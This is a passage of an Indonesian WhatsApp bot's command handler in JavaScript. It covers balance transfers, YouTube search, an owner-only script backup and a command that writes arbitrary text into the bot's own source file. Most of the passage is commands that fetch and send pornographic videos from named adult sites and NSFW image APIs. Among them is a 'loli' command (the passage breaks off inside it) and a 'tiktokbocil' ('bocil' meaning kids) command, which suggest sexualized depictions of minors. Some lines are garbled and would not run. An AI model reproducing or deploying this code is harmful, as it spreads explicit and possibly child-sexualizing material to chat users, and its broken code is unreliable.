if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah`)
const Kalender010 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`*USER SALDO*
 • ID : ${q.split(",")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender010}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break

case 'transfer': case 'tf':{
if (!isGroup) return reply(mess.group)
if (m.quoted) {
if (db.users[froms] == undefined) return reply('User tidak terdaftar didalam database!')
if (froms == sender) return reply('*[ Transfer ]* failed')
if (!args[0]) return reply(`*[ Transfer ]* masukkan nominal nya!`)
if (isNaN(args[0])) return reply(`*[ Transfer ]* nominal harus berupa angka!`)
if (Number(args[0]) >= 9999999999999999) return reply('Kebanyakan!')
let count = args[0].length > 0 ? Math.min(9999999999999999, Math.max(parseInt(args[0]), 1)) : Math.min(1)
if (count < 100) return reply('*[ Transfer ]* minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(m.quoted.sender, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer saldo sebesar *Rp. ${count}* kepada @${m.quoted.sender.split('@')[0]}`)
} else reply(`Saldo kamu tidak mencukupi untuk mentransfer saldo sebesar ${count}`)
} else if (q) {
let nominalnya = args[0].toString()
let tagnya = q.slice(args[0].length + 1, q.length).replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!(tagnya in users)) return reply('User tidak terdaftar didalam database!')
if (tagnya == sender) return reply('Tidak bisa transfer ke diri sendiri!')
if (!nominalnya) return reply(`Masukkan nominal nya!`)
if (isNaN(nominalnya)) return reply(`Nominal harus berupa angka!`)
if (Number(nominalnya) >= 9999999999999999) return reply('Kebanyakan!')
let count = nominalnya.length > 0 ? Math.min(9999999999999999, Math.max(parseInt(nominalnya), 1)) : Math.min(1)
if (count < 100) return reply('Minimal 100 untuk bisa transfer!')
if (cekSaldo(sender, db_saldo) >= count * 1) {
minSaldo(sender, count * 1, db_saldo)
addSaldo(tagnya, count * 1, db_saldo)
reply(`*SUCCESS TRANSFER*\n\n${tag} Sukses transfer balance sebesar *$${count}* kepada @${tagnya.split('@')[0]}`)
} else reply(`Balance kamu tidak mencukupi untuk mentransfer balance sebesar ${count}`)
} else reply(`Gunakan dengan cara ${command} *Reply Pesan Nominal*\n\nContoh : Reply Pesan Target ${command} 100`)
}
break

case 'yts': case 'ytsearch': {
//if (!isRegistered) return registerbut(noregis)
if (!text) throw `Example : ${prefix + command} story wa anime`
 let [l, r] = text.split`|`
 if (!l) l = ''
 if (!r) r = ''
 const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 let redmo = l + readMore + r
 let anu = (await yts(text)).all
 let video = anu.filter(v => v.type === 'video') 
let channel = anu.filter(v => v.type === 'channel') 
let teks = `*${monospa('Hasil Pencarian YouTube 👇')}*\n${redmo}${channel.map(v => `*${v.name}* (${v.url})\n_${v.subCountLabel} (${v.subCount}) Subscriber_\n${v.videoCount} video\n========================`.trim()

).join("\n")}`+`${video.map(v => `*${v.title}* (${v.url})\nDuration: ${v.timestamp}\nUploaded ${v.ago}
\n${v.views} views\n========================`.trim() ).join("\n")}`
let image = channel.length ? channel[0].image : video.length ? video[0].image : urlmenu.main

let sections = [{
		title: global.namebot2, 
		highlight_label: 'start chats', 
		rows: [{
			header: global.namebot2, 
	title: "Menu",
	description: `kembali ke menu !`, 
	id: '.menu'
	},
	{
		header: global.namebot2, 
		title: "Owner Bot", 
		description: "Owner bot, pemilik bot", 
		id: '.owner'
	}]
}]

video.forEach(async(data) => {
sections.push({
	title: data.title, 
	rows: [{
		title: "Get Video", 
		description: `Get video from "${data.title}"`, 
		id: `.ytmp4 ${data.url}`
		}, 
		{
		title: "Get Audio", 
		description: `Get audio from "${data.title}"`, 
		id: `.ytmp3 ${data.url}`
		}]
	}) 
}) 
let listMessage = {
    title: 'Download Media!!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.namebot2
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 subtitle: global.namebot2,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: image }}, { upload: Kenz.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage) 
 }, 
 ],
 })
 })
 }
 }
}, {})

await Kenz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
//Kenz si pler 🐎
break 

//mmkk

case "backup": case "getsc": case "getscs": {
if (!isCreator) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var backupname = `backup`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${backupname}.zip ${ls.join(" ")}`)
await Kenz.sendMessage(m.sender, {document: await fs.readFileSync(`./${backupname}.zip`), fileName: `${backupname}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${backupname}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break
//==
case 'addcase': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Mana case nya tuan..');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = './fitur.js';



// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n\n' + caseBaru + '\n\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                m.reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                Reply('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        Reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break
        //=========
//create base bot by@Kenz


        //=========
    case"script":case"infobot": case "inpoebot":{
Kenz.sendMessage(m.chat, {
  location: {
    degreesLatitude: -6.2088, // Ganti dengan latitude lokasi
    degreesLongitude: 106.8456, // Ganti dengan longitude lokasi
  },
  caption: `*\`乂 INFO/SC - BOT 乂\`*
> nameown : ${global.namaOwner}
> namebot : ${global.botname2}
> versi : ${global.versi}
> tipe : case X plugins 
> total fitur : ${totalfitur}
`,
  footer: "© Copyright By Kenz Satoru",
  buttons: [
          { buttonId: `.menu`,
          buttonText: {
          displayText: 'back menu awal'
          },
           type: 1 }
          ], // isi buttons nya
  headerType: 6,
  viewOnce: true
}, { quoted: m });
}
//Kenz si pler 🐎
break 

//+++++++
//================================================================================
// FITUR ASUPAN
case 'bokep1':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
Kenz.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep2':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Kenz.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep3':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Kenz.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep4':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Kenz.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep5':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Kenz.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep6':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
Kenz.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep7':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Kenz.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep8':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Kenz.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep9':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Kenz.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep10':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
Kenz.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep11':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Kenz.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep12':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah12 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Kenz.sendMessage(from, { video: ntahlah12, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep13':
if (!isCreator&&!isPremium) return reply(mess.prem)
let ntahlah13 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Kenz.sendMessage(from, { video: ntahlah13, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep14':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah14 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Kenz.sendMessage(from, { video: ntahlah14, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep15':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah15 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Kenz.sendMessage(from, { video: ntahlah15, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep16':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah16 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Ballerina-bot-facial.mp4`)
Kenz.sendMessage(from, { video: ntahlah16, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep17':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah17 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Kenz.sendMessage(from, { video: ntahlah17, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep18':
if (!isCreator&&!isPremium) return reply(mess.prem)
//if (!isGroup) return onlyGroup()
let ntahlah18 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Kenz.sendMessage(from, { video: ntahlah18, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break

case 'tiktokgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var asupan = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/tiktokgirl.json'))
var ii = pickRandom(asupan)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: ii.url }}, { quoted: m })
break
case 'tiktokghea':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var gheayubi = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/gheayubi.json'))
var iii = pickRandom(gheayubi)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iii.url }}, { quoted: m })
break
case 'tiktokbocil':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var bocil = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/bocil.json'))
var iiii = pickRandom(bocil)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiii.url }}, { quoted: m })
break
case 'tiktoknukhty':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var ukhty = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/ukhty.json'))
var iiiii = pickRandom(ukhty)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiii.url }}, { quoted: m })
break
case 'tiktoksantuy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var santuy = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/santuy.json'))
var iiiiii = pickRandom(santuy)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiii.url }}, { quoted: m })
break
case 'tiktokkayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var kayes = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/kayes.json'))
var iiiiiii = pickRandom(kayes)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiii.url }}, { quoted: m })
break
case 'tiktokpanrika':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var rikagusriani = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/panrika.json'))
var iiiiiiii = pickRandom(rikagusriani)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiii.url }}, { quoted: m })
break
case 'tiktoknotnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokvids/notnot.json'))
var iiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', video: { url: iiiiiiiii.url }}, { quoted: m })
break
case 'chinese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/china.json'))
var iiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiii.url } }, { quoted: m })
break
case 'hijab':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/hijab.json'))
var iiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiii.url } }, { quoted: m })
break

case 'indo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/indonesia.json'))
var iiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiii.url } }, { quoted: m })
break
case 'japanese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/japan.json'))
var iiiiiiiiiiiii = pickRandom(notnot)
Kenz.m.quoted.senderKenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiii.url } }, { quoted: m })
break
case 'korean':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/korea.json'))
var iiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'malay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/malaysia.json'))
var iiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomgirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/random.json'))
var iiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'randomboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/random2.json'))
var iiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'thai':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/thailand.json'))
var iiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'vietnamese':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/tiktokpics/vietnam.json'))
var iiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'aesthetic':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/aesthetic.json'))
var iiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'antiwork':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/antiwork.json'))
var iiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'blackpink2':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/blackpink.json'))
var iiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'bike':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/bike.json'))
var iiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'boneka':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/boneka.json'))
var iiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cosplay':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./resource/randompics/cosplay.json'))
var iiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'cat':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/cat.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiii = pickRandom(notnot)
DKenz.endMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiii.url } }, { quoted: m })
break
case 'doggo':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/doggo.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiil = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiil.url } }, { quoted: m })
break
case 'justina':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/justina.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiill = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiill.url } }, { quoted: m })
break

case 'kayes':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/kayes.json'))
var iiiiiiiiiiiiiiiiiiiiiiiiiilll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: iiiiiiiiiiiiiiiiiiiiiiiiiilll.url } }, { quoted: m })
break
case 'kpop':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/kpop.json'))
var ll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: ll.url } }, { quoted: m })
break
case 'notnot':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/notnot.json'))
var lll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lll.url } }, { quoted: m })
break
case 'car':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/car.json'))
var llll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: llll.url } }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/ppcouple.json'))
var lllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllll.url } }, { quoted: m })
break
case 'profilepic': case 'profilepicture':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/profile.json'))
var llllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllll.url } }, { quoted: m })
break
case 'pubg':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/pubg.json'))
var lllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllll.url } }, { quoted: m })
break
case 'rose':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/rose.json'))
var llllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllll.url } }, { quoted: m })
break
case 'ryujin':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/ryujin.json'))
var lllllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllll.url } }, { quoted: m })
break
case 'ulzzangboy':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/ulzzangboy.json'))
var llllllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllll.url } }, { quoted: m })
break
case 'ulzzanggirl':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/ulzzanggirl.json'))
var lllllllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllll.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
//if (!isRegistered) return registerbut(noregis)
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/wallml.json'))
var llllllllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: llllllllllll.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
reply('Wet ngabs')
var notnot = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/randompics/wallhp.json'))
var lllllllllllll = pickRandom(notnot)
Kenz.sendMessage(m.chat, { caption: 'don banh', image: { url: lllllllllllll.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hentai':
case 'hneko' :
//if (!isRegistered) return registerbut(noregis)
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
Kenz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd2.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
//if (!isRegistered) return registerbut(noregis)
await Kenz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
 let waifudd3 = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
Kenz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd3.data.url } }, { quoted: m })
break
case 'gasm':
//if (!isRegistered) return registerbut(noregis)
await Kenz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})						
 let waifudd4 = await axios.get(`https://nekos.life/api/v2/img/${command}`)
Kenz.sendMessage(m.chat, { caption: "Done 🍏", image: { url:waifudd4.data.url } }, { quoted: m })
break 
case 'milf':
//if (!isRegistered) return registerbut(noregis)
await Kenz.sendMessage(m.chat, {react: {text: '🥵', key: m.key}})
var ahegaonsfw = JSON.parse(fs.readFileSync('./sistem-Kenz/resource/nsfw/milf.json'))
var kymyresult = pickRandom(ahegaonsfw)
Kenz.sendMessage(m.chat, { caption: "Done 🍏", image: { url: kymyresult.url } }, { quoted: m })
break 
case 'animespank':				
	//if (!isRegistered) return registerbut(noregis)
 let waifudd5 = await await axios.get(`https://nekos.life/api/v2/img/spank`) 
 Kenz.sendMessage(m.chat, { caption: `Here you go!`, image: {url:waifudd5.data.url} },{ quoted:m }).catch(err => {
 return('Error!')
 })
break
case 'loli': {
let baseUrl = 'https://weeb-api.vercel.app/'
const response = await fetch(baseUrl + command)
const imageBuffer = await response.buffer()
//Kenz.sendMessage(m.chat, {image:imageBuffer, caption: mess.done}, {quoted: m})
